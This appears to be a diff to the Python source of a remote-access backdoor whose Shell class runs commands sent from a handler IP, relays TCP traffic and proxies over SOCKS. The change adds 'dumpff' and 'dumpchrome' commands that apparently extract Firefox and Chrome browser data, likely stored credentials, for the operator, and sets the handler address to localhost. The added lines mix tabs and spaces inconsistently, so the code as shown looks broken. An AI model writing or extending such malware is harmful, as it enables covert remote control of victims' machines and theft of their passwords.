@@ -3,8 +3,11 @@ import socket, subprocess, os, threading, json, base64, datetime, getpass, time,
 from Crypto.Cipher import AES
 from twisted.internet import reactor
 from twisted.protocols import socks
+import dumpff
+if os.name =="nt":
+    import dumpchrome
 
-HANDLER_IP = "192.168.0.107"
+HANDLER_IP = "127.0.0.1"
 
 def windows_only(func):
 	def tester(junk):
@@ -141,7 +144,15 @@ class Shell:
 	def windows_only_thing(self):
 		print "ass1"
 		return "ass"
-		
+
+        @windows_only
+        def dumpff(self):
+	    return dumpff.main()
+       
+        @windows_only
+        def dumpchrome(self):
+            return dumpchrome.main()
+
 	def change_directory(self, dir):
 		try:
 			os.chdir(dir)
@@ -239,6 +250,10 @@ class Shell:
 				output = self.create_tcp_relay()
 			elif arguments == "stop":
 				output = self.stop_tcp_relay()
+                elif command == "dumpff":
+                        output = self.dumpff()
+		elif command == "dumpchrome":
+		        output = self.dumpchrome()
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
